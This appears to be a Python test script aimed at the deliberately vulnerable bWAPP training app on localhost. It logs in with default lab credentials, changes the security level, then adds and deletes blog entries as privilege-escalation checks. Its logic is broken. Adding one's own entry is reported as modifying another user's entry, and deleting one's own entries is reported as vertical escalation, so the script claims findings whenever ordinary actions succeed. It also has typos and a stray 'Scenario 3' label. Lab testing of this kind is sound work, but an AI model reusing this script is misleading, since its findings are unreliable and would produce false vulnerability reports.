import requests

# Replace these values with your own
BWAPP_URL = "http://localhost/bWAPP"
USERNAME = "bee"
PASSWORD = "bug"
NEW_ENTRY = "This is an unauthorized modification."

session = requests.Session()

def login():
    login_url = f"{BWAPP_URL}/login.php"
    data = {
        'login': USERNAME,
        'password': PASSWORD,
        'form': 'submit'
    }
    try:
        response = session.post(login_url, data=data, timeout=10)
        if response.status_code == 200 and ("Welcome" in response.text or "Logout" in response.text):
            print("[+] Logged in successfully.")
            return True
        else:
            print("[-] Failed to log in.")
            return False
    except requests.exceptions.RequestException as e:
        print(f"[-] Login request failed: {e}")
        return False

def change_security_level(new_level):
    set_level_url = f"{BWAPP_URL}/security_level_set.php"
    data = {
        'security_level': new_level,
        'form': 'submit'
    }
    try:
        response = session.post(set_level_url, data=data, timeout=10)
        if response.status_code == 200 and "Current: <b>" in response.text:
            print(f"[+] Security level changed to {new_level}.")
        else:
            print(f"[-] Failed to change security level to {new_level}.")
    except requests.exceptions.RequestException as e:
        print(f"[-] Request to change security level failed: {e}")

def add_blog_entry(new_entry):
    add_entry_url = f"{BWAPP_URL}/xss_stored_1.php"
    data = {
        'entry': new_entry,
        'entry_add': 'on',
        'form': 'submit'
    }
    try:
        response = session.post(add_entry_url, data=data, timeout=10)
        if response.status_code == 200 and "Your entry was added" in response.text:
            print("+] Horizontal privilege escalation detected: Updated another user's blog entry.")
        else:
            print(f"[-] Failed to add blog entry. Status code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"[-] Request to add blog entry failed: {e}")

# Scenario 3: Vertical privilege escalation by deleting another user's blog entry
def delete_other_user_blog_entry():
    delete_entry_url = f"{BWAPP_URL}/xss_stored_1.php"
    data = {
        'entry_delete': 'on',
        'form': 'submit'
    }
    response = session.post(delete_entry_url, data=data)
    if "All your entries were deleted!" in response.text:
        print("[+] Vertical privilege escalation detected: Deleted another user's blog entry.")
    else:
        print("[-] No vertical privilege escalation detected.")

if __name__ == "__main__":
    if login():
        # Change security level to high (2)
        change_security_level(new_level=2)
        
        # Add a new blog entry
        print("[*] Testing Horizontal privilege escalation...")
        add_blog_entry(new_entry=NEW_ENTRY)

     #Vertical privilege escalation
        print("[*] Testing vertical privilege escalation...")
        delete_other_user_blog_entry()
    else:
        print("[-] Exiting script due to failed login.")
